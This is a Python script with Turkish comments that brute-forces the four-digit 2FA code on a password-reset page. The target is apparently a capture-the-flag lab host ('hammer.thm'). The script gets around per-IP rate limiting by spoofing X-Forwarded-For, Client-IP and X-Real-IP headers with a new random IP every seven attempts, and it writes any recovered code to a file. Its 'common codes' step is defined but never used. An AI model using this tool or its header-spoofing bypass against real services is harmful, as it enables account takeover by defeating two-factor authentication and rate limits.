import requests
import time
from itertools import cycle
import random

def ip_degistirici():
    """Farklı IP'ler oluştur (private IP aralığında)"""
    return f"10.114.{random.randint(1,254)}.{random.randint(1,254)}"

def iki_faktor_bruteforce():
    url = "http://10.114.136.174:1337/reset_password.php"
    email = "tester@hammer.thm"
    
    # Denenecek 2FA kodları (0000-9999 arası)
    # Hızlı test için küçük aralık, gerçekte range(10000) kullan
    kodlar = range(10000)  # 0000'den 9999'a
    
    deneme_sayisi = 0
    max_deneme = 7
    
    for kod in kodlar:
        # 7 denemede bir IP değiştir
        if deneme_sayisi >= max_deneme:
            print(f"\n[+] 7 deneme tamamlandı, IP değiştiriliyor...")
            deneme_sayisi = 0
            time.sleep(1)  # IP değişimi için bekle
        
        # Yeni IP oluştur (ilk deneme veya IP değişimi gerekiyorsa)
        if deneme_sayisi == 0:
            current_ip = ip_degistirici()
            print(f"\n[+] Yeni IP kullanılıyor: {current_ip}")
        
        # İstek başlıkları
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'X-Forwarded-For': current_ip,
            'Client-IP': current_ip,
            'X-Real-IP': current_ip,
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        # POST verileri
        data = {
            'email': email,
            '2fa_code': f"{kod:04d}"  # 4 haneli kod
        }
        
        try:
            print(f"[*] Deneniyor: {kod:04d} (IP: {current_ip})", end='\r')
            
            response = requests.post(url, data=data, headers=headers, timeout=3)
            deneme_sayisi += 1
            print(f"status code: {response.status_code}//")
            # Başarılı kodu bulduk mu kontrol et
            if "Invalid or expired recovery code!" not in response.text:
                
                print(f"\n\n[!!!] BAŞARILI! Kod bulundu: {kod:04d}")
                print(f"[!!!] Sunucu yanıtı: {response.text[:200]}")
                    
                    # Başarılı kodu dosyaya kaydet
                with open('bulunan_kod.txt', 'w') as f:
                    f.write(f"2FA Kodu: {kod:04d}\n")
                    f.write(f"IP: {current_ip}\n")
                    f.write(f"Yanıt: {response.text}")
                    
                return kod

            
        except requests.exceptions.RequestException as e:
            print(f"\n[!] Hata: {e}")
            time.sleep(2)
            continue

    print("\n[!] Kod bulunamadı!")
    return None

def akilli_bruteforce():
    """Daha akıllı brute force - önce yaygın kodları dene"""
    
    # Önce en yaygın 2FA kodları
    yaygin_kodlar = [
        1234, 0000, 1111, 2222, 3333, 4444, 5555, 6666, 7777, 8888, 9999,
        1122, 1212, 1230, 1231, 1232, 1233, 1235
    ]
    
    print("[+] Yaygın kodlar taranıyor...")
    sonuc = iki_faktor_bruteforce()
    
    if sonuc:
        return sonuc
    
    print("[+] Yaygın kodlar bulunamadı, tüm kombinasyonlar taranıyor...")
    return iki_faktor_bruteforce()

if __name__ == "__main__":
    print("=== 2FA Brute Force Aracı ===")
    print("Hedef: http://10.114.136.174:1337/reset_password.php")
    print("Email: tester@hammer.thm")
    print("=" * 40)
    
    try:
        bulunan_kod = akilli_bruteforce()
        
        if bulunan_kod is not None:
            print(f"\n✅ 2FA Kodu: {bulunan_kod:04d}")
        else:
            print("\n❌ Kod bulunamadı!")
            
    except KeyboardInterrupt:
        print("\n\n[!] Kullanıcı tarafından durduruldu.")